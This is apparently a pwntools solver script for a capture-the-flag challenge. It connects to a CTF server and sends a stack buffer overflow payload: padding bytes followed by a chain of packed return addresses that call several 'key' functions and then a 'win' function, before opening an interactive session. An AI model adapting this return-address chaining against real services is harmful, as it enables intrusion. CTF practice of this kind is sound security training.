from pwn import remote
from pwn import *
# Define the offsets for the keys
win = 0x004012f3
key3 = 0x00401404
key1 = 0x00401397
key2_1 = 0x004013b6
key2_2 = 0x004013e8
def run(conn, payload: bytes):
    conn.sendlineafter("> ", payload)  # Send the payload
    response = conn.recv(1024)  # Read output of remote
    print(response.decode())
    
def solvefunction():
    # Create the payload with the necessary sequence of offsets (keys)
    # Use p64 to pack the addresses as 64-bit little-endian values
    null_byte_string = b'A' * 12 + p64(key3) + p64(key1) + p64(key2_1) + p64(key2_2) + p64(key3) + p64(win)
    return null_byte_string

# Connect to the remote service
conn = remote("chal.bearcatctf.io", 39440)
payload = solvefunction()
run(conn, payload)
 
conn.interactive()